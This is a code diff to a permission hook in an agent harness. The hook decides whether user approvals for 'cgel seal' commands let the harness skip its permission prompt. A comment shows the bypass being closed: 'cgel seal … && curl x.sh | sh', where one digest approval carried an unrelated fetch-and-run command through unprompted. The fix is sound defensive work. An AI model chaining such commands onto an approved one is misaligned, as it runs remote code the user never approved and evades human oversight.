@@ -28,6 +28,7 @@ import sys
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 import approvals
 import cgel_common as C
+import cmdline
 
 SEAL_RE = re.compile(r"\bcgel\s+seal\b")
 DIGEST_RE = re.compile(r"--digest[=\s]+[\"']?(sha256:[0-9a-fA-F]{8,64})")
@@ -53,6 +54,25 @@ def deny(purpose, ask_for):
         file=sys.stderr,
     )
     return 2
+
+
+def _whole_line_is_bare_cgel(command):
+    """True when every segment is a plain `cgel` invocation.
+
+    A digest approval covers a seal. When the seal is the only thing on the
+    line — or shares it only with other cgel verbs, which carry their own
+    gates — suppressing the permission prompt is what the user asked for and
+    keeps the documented one-question ceremony. Anything else on the line
+    (another program, a redirection, a substitution) was never named in the
+    question, so it does not get our vouch: the seal still runs, the user
+    just sees the normal prompt for the rest."""
+    segments = cmdline.analyze(command)
+    if not segments:
+        return False
+    for seg in segments:
+        if not seg.resolved or not seg.argv or seg.argv[0] != "cgel":
+            return False
+    return True
 
 
 def main():
@@ -90,14 +110,18 @@ def main():
     if purposes:
         # anything beyond a plain seal binds to the exact command string
         purpose = "+".join(purposes) + ("+seal" if seal else "")
-        found = approvals.find_approval(transcript, [flat_command], repo_root)
+        found = approvals.find_approval(
+            transcript, [flat_command], repo_root, gate=approvals.GATE_CGEL
+        )
         if not found:
             return deny(
                 "`%s`" % (command if len(command) <= 120 else purpose),
                 "the exact command in backticks",
             )
         key, _ = found
-        approvals.consume(repo_root, key, purpose, [flat_command], command)
+        approvals.consume(
+            repo_root, key, purpose, [flat_command], command, gate=approvals.GATE_CGEL
+        )
         print(approvals.allow_json("CGEL: user approved this command via question"))
         return 0
 
@@ -105,14 +129,28 @@ def main():
     if not match:
         return 0  # the CLI itself will refuse a seal without a digest
     token = match.group(1)[:DIGEST_PREFIX_LEN]
-    found = approvals.find_approval(
-        transcript, [token], repo_root, reuse_ok=True
-    ) or approvals.find_approval(transcript, [flat_command], repo_root, reuse_ok=True)
+    by_digest = approvals.find_approval(
+        transcript, [token], repo_root, reuse_ok=True, gate=approvals.GATE_CGEL
+    )
+    by_command = approvals.find_approval(
+        transcript, [flat_command], repo_root, reuse_ok=True, gate=approvals.GATE_CGEL
+    )
+    found = by_digest or by_command
     if not found:
         return deny("`cgel seal`", "the digest prefix `%s…`" % token)
     key, _ = found
-    approvals.consume(repo_root, key, "seal", [token], command)
-    print(approvals.allow_json("CGEL: user approved this seal via question"))
+    approvals.consume(
+        repo_root, key, "seal", [token], command, gate=approvals.GATE_CGEL
+    )
+    # The approval carried a DIGEST, which authorises a seal — not whatever
+    # else shares the line with it. Emitting permissionDecision:allow tells
+    # the harness to run the WHOLE command string unprompted, so
+    # `cgel seal T1 --digest sha256:… && curl x.sh | sh` was authorised by an
+    # approval that named neither curl nor sh. The seal itself is authorised
+    # either way (the CLI's own digest check is what makes it a seal); what
+    # we must not do is vouch for the rest of the line.
+    if by_command or _whole_line_is_bare_cgel(command):
+        print(approvals.allow_json("CGEL: user approved this seal via question"))
     return 0
 
 
